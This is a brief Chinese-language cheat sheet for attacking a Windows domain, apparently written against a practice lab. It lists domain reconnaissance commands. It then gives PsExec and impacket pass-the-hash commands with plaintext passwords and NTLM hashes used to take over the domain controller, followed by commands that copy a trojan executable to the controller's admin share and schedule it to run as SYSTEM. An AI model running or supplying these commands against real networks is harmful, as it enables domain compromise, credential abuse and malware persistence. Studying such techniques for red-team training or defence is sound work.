[干货 | 域内敏感信息搜集](https://mp.weixin.qq.com/s/nFOAb__c162gMhve3MEh_Q)

## 信息收集

```shell
net time /domain # 判断当前主机是否在域内
net user /domain
获取域内用户的详细信息：
wmic useraccount get /all

net group "domain controllers" /domain # 查看域管理员 OWA$
ping OWA # 域控主机即可获得域控IP
查看所有域成员计算机列表：net group "domain computers" /domain
查看本地管理组：net localgroup administrators /domain

# 三种情况
##1. 存在域，但当前用户不是域用户，提示说明权限不够
##2. 存在域，并且当前用户是域用户
##3. 当前网络环境为工作组，不存在域
```


## 攻击 

```shell
# PSTools 使用哈希传递(PTH)攻击 https://mp.weixin.qq.com/s/6BYAeo-5I1XMejyC5ec1pw
PsExec.exe \\192.168.52.138 -u god\administrator -p hongrisec@2022 -s cmd #成功，拿下域控了。
# impact: pip install impacket, win下pyexec用对应的py文件 python psexec.py xxxxxxx
psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.138 #成功，拿下域控了。
psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.141 #成功，拿下域控了。

win7共享给域控
copy c:\phpstudy\srn7final.exe \\192.168.52.138\c$
设置计划任务启动木马
schtasks /create /tn "test123456" /tr C:\srn7final.exe /sc once /st 14.25 /S 192.168.52.138 /RU System /u administrator /p "hongrisec@2021"
```